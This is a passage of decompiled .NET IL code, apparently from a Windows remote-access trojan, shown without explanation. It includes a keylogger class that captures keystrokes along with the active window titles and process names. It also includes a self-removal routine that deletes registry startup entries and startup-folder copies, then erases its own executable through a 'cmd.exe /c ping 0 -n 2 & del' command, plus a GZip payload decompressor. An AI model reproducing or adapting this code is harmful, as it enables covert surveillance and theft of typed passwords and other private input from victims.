                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0035:  ldc.i4.1
      IL_0036:  stloc.0
      IL_0037:  leave.s    IL_0054

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0039:  dup
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003f:  stloc.1
      IL_0040:  ldloc.1
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.0
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0052:  leave.s    IL_0054

    }  // end handler
    IL_0054:  ldloc.0
    IL_0055:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       527 (0x20f)
    .maxstack  4
    .locals init (string V_0,
             string[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0057

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldsfld     string j.OK::RG
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brfalse.s  IL_0045

      IL_0035:  ldloc.0
      IL_0036:  ldsfld     string j.OK::RG
      IL_003b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0040:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0045:  leave.s    IL_0053

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  leave.s    IL_0053

    }  // end handler
    IL_0053:  ldloc.2
    IL_0054:  ldc.i4.1
    IL_0055:  add.ovf
    IL_0056:  stloc.2
    IL_0057:  ldloc.2
    IL_0058:  ldloc.1
    IL_0059:  ldlen
    IL_005a:  conv.i4
    IL_005b:  blt.s      IL_001f

    IL_005d:  ldc.i4.0
    IL_005e:  call       void j.OK::pr(int32)
    IL_0063:  ldc.i4.0
    IL_0064:  stsfld     bool j.OK::Isu
    .try
    {
      IL_0069:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_006e:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0073:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0078:  ldsfld     string j.OK::sf
      IL_007d:  ldc.i4.1
      IL_007e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0083:  ldsfld     string j.OK::RG
      IL_0088:  ldc.i4.0
      IL_0089:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_008e:  leave.s    IL_00a9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0090:  dup
      IL_0091:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0096:  stloc.3
      IL_0097:  ldloc.3
      IL_0098:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_009d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00a7:  leave.s    IL_00a9

    }  // end handler
    IL_00a9:  nop
    .try
    {
      IL_00aa:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00af:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00b4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_00b9:  ldsfld     string j.OK::sf
      IL_00be:  ldc.i4.1
      IL_00bf:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_00c4:  ldsfld     string j.OK::RG
      IL_00c9:  ldc.i4.0
      IL_00ca:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_00cf:  leave.s    IL_00ec

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00d1:  dup
      IL_00d2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00d7:  stloc.s    V_4
      IL_00d9:  ldloc.s    V_4
      IL_00db:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ea:  leave.s    IL_00ec

    }  // end handler
    IL_00ec:  nop
    .try
    {
      IL_00ed:  ldsfld     bool j.OK::HIDE_ME
      IL_00f2:  brfalse.s  IL_0117

      IL_00f4:  ldsfld     string j.OK::DR
      IL_00f9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_00fe:  ldstr      "\\"
      IL_0103:  ldsfld     string j.OK::EXE
      IL_0108:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_010d:  ldc.i4     0x80
      IL_0112:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_0117:  ldc.i4.7
      IL_0118:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_011d:  ldstr      "\\"
      IL_0122:  ldsfld     string j.OK::RG
      IL_0127:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_012c:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
      IL_0131:  stloc.s    V_5
      IL_0133:  ldc.i4.7
      IL_0134:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0139:  ldstr      "\\"
      IL_013e:  ldloc.s    V_5
      IL_0140:  ldstr      ".url"
      IL_0145:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_014a:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_014f:  ldc.i4.7
      IL_0150:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0155:  ldstr      "\\"
      IL_015a:  ldsfld     string j.OK::RG
      IL_015f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0164:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0169:  leave.s    IL_0186

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_016b:  dup
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0171:  stloc.s    V_6
      IL_0173:  ldloc.s    V_6
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_017a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0184:  leave.s    IL_0186

    }  // end handler
    IL_0186:  nop
    .try
    {
      IL_0187:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_018c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0191:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0196:  ldstr      "Software"
      IL_019b:  ldc.i4.1
      IL_019c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01a1:  ldsfld     string j.OK::RG
      IL_01a6:  ldc.i4.0
      IL_01a7:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_01ac:  leave.s    IL_01c9

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ae:  dup
      IL_01af:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b4:  stloc.s    V_7
      IL_01b6:  ldloc.s    V_7
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c7:  leave.s    IL_01c9

    }  // end handler
    IL_01c9:  nop
    .try
    {
      IL_01ca:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_01cf:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01d4:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01d9:  ldstr      "\""
      IL_01de:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01e3:  ldc.i4.0
      IL_01e4:  ldc.i4.0
      IL_01e5:  ldc.i4.m1
      IL_01e6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01eb:  pop
      IL_01ec:  leave.s    IL_0209

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ee:  dup
      IL_01ef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f4:  stloc.s    V_8
      IL_01f6:  ldloc.s    V_8
      IL_01f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0202:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0207:  leave.s    IL_0209

    }  // end handler
    IL_0209:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_020e:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       105 (0x69)
    .maxstack  4
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             class [System]System.IO.Compression.GZipStream V_1,
             uint8[] V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  ldc.i4.0
    IL_0009:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000e:  stloc.1
    IL_000f:  ldc.i4.4
    IL_0010:  newarr     [mscorlib]System.Byte
    IL_0015:  stloc.2
    IL_0016:  ldloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001d:  ldc.i4.5
    IL_001e:  conv.i8
    IL_001f:  sub.ovf
    IL_0020:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0025:  ldloc.0
    IL_0026:  ldloc.2
    IL_0027:  ldc.i4.0
    IL_0028:  ldc.i4.4
    IL_0029:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_002e:  pop
    IL_002f:  ldloc.2
    IL_0030:  ldc.i4.0
    IL_0031:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0036:  stloc.3
    IL_0037:  ldloc.0
    IL_0038:  ldc.i4.0
    IL_0039:  conv.i8
    IL_003a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_003f:  ldloc.3
    IL_0040:  ldc.i4.1
    IL_0041:  sub.ovf
    IL_0042:  ldc.i4.1
    IL_0043:  add.ovf
    IL_0044:  ldc.i4.1
    IL_0045:  sub.ovf
    IL_0046:  ldc.i4.1
    IL_0047:  add.ovf
    IL_0048:  newarr     [mscorlib]System.Byte
    IL_004d:  stloc.s    V_4
    IL_004f:  ldloc.1
    IL_0050:  ldloc.s    V_4
    IL_0052:  ldc.i4.0
    IL_0053:  ldloc.3
    IL_0054:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0059:  pop
    IL_005a:  ldloc.1
    IL_005b:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0060:  ldloc.0
    IL_0061:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0066:  ldloc.s    V_4
    IL_0068:  ret
  } // end of method OK::ZIP

} // end of class j.OK

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000d:  ldarg.0
    IL_000e:  ldstr      ""
    IL_0013:  stfld      string j.kl::Logs
    IL_0018:  ldarg.0
    IL_0019:  ldstr      "[kl]"
    IL_001e:  stfld      string j.kl::vn
    IL_0023:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       216 (0xd8)
    .maxstack  5
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             valuetype [mscorlib]System.DateTime V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 j.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string j.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brtrue.s   IL_00b3

      IL_004c:  ldarg.0
      IL_004d:  ldloca.s   V_2
      IL_004f:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0054:  stfld      int32 j.kl::LastAV
      IL_0059:  ldarg.0
      IL_005a:  ldloc.3
      IL_005b:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0060:  stfld      string j.kl::LastAS
      IL_0065:  ldc.i4.6
      IL_0066:  newarr     [mscorlib]System.String
      IL_006b:  dup
      IL_006c:  ldc.i4.0
      IL_006d:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_0072:  stelem.ref
      IL_0073:  dup
      IL_0074:  ldc.i4.1
      IL_0075:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_007a:  stloc.s    V_4
      IL_007c:  ldloca.s   V_4
      IL_007e:  ldstr      "yy/MM/dd "
      IL_0083:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0088:  stelem.ref
      IL_0089:  dup
      IL_008a:  ldc.i4.2
      IL_008b:  ldloc.3
      IL_008c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0091:  stelem.ref
      IL_0092:  dup
      IL_0093:  ldc.i4.3
      IL_0094:  ldstr      " "
      IL_0099:  stelem.ref
      IL_009a:  dup
      IL_009b:  ldc.i4.4
      IL_009c:  ldarg.0
      IL_009d:  ldfld      string j.kl::LastAS
      IL_00a2:  stelem.ref
      IL_00a3:  dup
      IL_00a4:  ldc.i4.5
      IL_00a5:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00aa:  stelem.ref
      IL_00ab:  call       string [mscorlib]System.String::Concat(string[])
      IL_00b0:  stloc.0
      IL_00b1:  leave.s    IL_00d6

      IL_00b3:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b5:  dup
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bb:  stloc.s    V_5
      IL_00bd:  ldloc.s    V_5
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ce:  leave.s    IL_00d0

    }  // end handler
    IL_00d0:  ldstr      ""
    IL_00d5:  stloc.0
    IL_00d6:  ldloc.0
    IL_00d7:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       380 (0x17c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             bool V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             class [mscorlib]System.Exception V_4,
             char V_5)
    IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000f:  stloc.2
    IL_0010:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0015:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_001f:  brfalse.s  IL_002a

    IL_0021:  ldloc.2
    IL_0022:  brfalse.s  IL_0028

    IL_0024:  ldc.i4.0
    IL_0025:  stloc.2
    IL_0026:  br.s       IL_002a

    IL_0028:  ldc.i4.1
    IL_0029:  stloc.2
    IL_002a:  nop
    .try
    {
      IL_002b:  ldarg.1
      IL_002c:  stloc.3
      IL_002d:  ldloc.3
      IL_002e:  ldc.i4.s   35
      IL_0030:  bgt.s      IL_0066

      IL_0032:  ldloc.3
      IL_0033:  ldc.i4.s   13
      IL_0035:  bgt.s      IL_0050

      IL_0037:  ldloc.3
      IL_0038:  ldc.i4.8
      IL_0039:  beq.s      IL_00a1

      IL_003b:  ldloc.3
      IL_003c:  ldc.i4.s   9
      IL_003e:  beq        IL_00fe

      IL_0043:  ldloc.3
      IL_0044:  ldc.i4.s   13
      IL_0046:  beq        IL_00d9

      IL_004b:  br         IL_0106

      IL_0050:  ldloc.3
      IL_0051:  ldc.i4.s   16
      IL_0053:  sub
      IL_0054:  ldc.i4.1
      IL_0055:  ble.un.s   IL_00c3

      IL_0057:  ldloc.3
      IL_0058:  ldc.i4.s   32
      IL_005a:  beq.s      IL_00ce

      IL_005c:  ldloc.3
      IL_005d:  ldc.i4.s   35
      IL_005f:  beq.s      IL_00c3

      IL_0061:  br         IL_0106

      IL_0066:  ldloc.3
      IL_0067:  ldc.i4     0xa3
      IL_006c:  bgt.s      IL_0087

      IL_006e:  ldloc.3
      IL_006f:  ldc.i4.s   46
      IL_0071:  beq.s      IL_00a1

      IL_0073:  ldloc.3
      IL_0074:  ldc.i4.s   112
      IL_0076:  sub
      IL_0077:  ldc.i4.s   11
      IL_0079:  ble.un.s   IL_00c3

      IL_007b:  ldloc.3
      IL_007c:  ldc.i4     0xa0
      IL_0081:  sub
      IL_0082:  ldc.i4.3
      IL_0083:  ble.un.s   IL_00c3

      IL_0085:  br.s       IL_0106

      IL_0087:  ldloc.3
      IL_0088:  ldc.i4     0x10000
      IL_008d:  beq.s      IL_00c3

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4     0x20000
      IL_0095:  beq.s      IL_00c3

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4     0x40000
      IL_009d:  beq.s      IL_00c3

      IL_009f:  br.s       IL_0106

      IL_00a1:  ldstr      "["
      IL_00a6:  ldarga.s   k
      IL_00a8:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00ae:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00b3:  ldstr      "]"
      IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bd:  stloc.0
      IL_00be:  leave      IL_017a

      IL_00c3:  ldstr      ""
      IL_00c8:  stloc.0
      IL_00c9:  leave      IL_017a

      IL_00ce:  ldstr      " "
      IL_00d3:  stloc.0
      IL_00d4:  leave      IL_017a

      IL_00d9:  ldarg.0
      IL_00da:  ldfld      string j.kl::Logs
      IL_00df:  ldstr      "[ENTER]\r\n"
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_00e9:  brfalse.s  IL_00f6

      IL_00eb:  ldstr      ""
      IL_00f0:  stloc.0
      IL_00f1:  leave      IL_017a

      IL_00f6:  ldstr      "[ENTER]\r\n"
      IL_00fb:  stloc.0
      IL_00fc:  leave.s    IL_017a

      IL_00fe:  ldstr      "[TAP]\r\n"
      IL_0103:  stloc.0
      IL_0104:  leave.s    IL_017a

      IL_0106:  ldloc.2
      IL_0107:  brfalse.s  IL_0118

      IL_0109:  ldarg.1
      IL_010a:  conv.ovf.u4
      IL_010b:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0110:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0115:  stloc.0
      IL_0116:  leave.s    IL_017a

      IL_0118:  ldarg.1
      IL_0119:  conv.ovf.u4
      IL_011a:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_011f:  stloc.1
      IL_0120:  leave.s    IL_0178

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0122:  dup
      IL_0123:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0128:  stloc.s    V_4
      IL_012a:  ldloc.s    V_4
      IL_012c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0131:  ldloc.2
      IL_0132:  brfalse.s  IL_0157

      IL_0134:  ldarg.1
      IL_0135:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_013a:  stloc.s    V_5
      IL_013c:  ldloca.s   V_5
      IL_013e:  call       instance string [mscorlib]System.Char::ToString()
      IL_0143:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0148:  stloc.1
      IL_0149:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014e:  ldloc.1
      IL_014f:  stloc.0
      IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0155:  leave.s    IL_017a

      IL_0157:  ldarg.1
      IL_0158:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_015d:  stloc.s    V_5
      IL_015f:  ldloca.s   V_5
      IL_0161:  call       instance string [mscorlib]System.Char::ToString()
      IL_0166:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_016b:  stloc.1
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0171:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0176:  leave.s    IL_0178

    }  // end handler
    IL_0178:  ldloc.1
    IL_0179:  stloc.0
    IL_017a:  ldloc.0
    IL_017b:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       138 (0x8a)
    .maxstack  7
    .locals init (string V_0,
             class [mscorlib]System.Text.StringBuilder V_1,
             uint8[] V_2,
             uint32 V_3,
             int32 V_4,
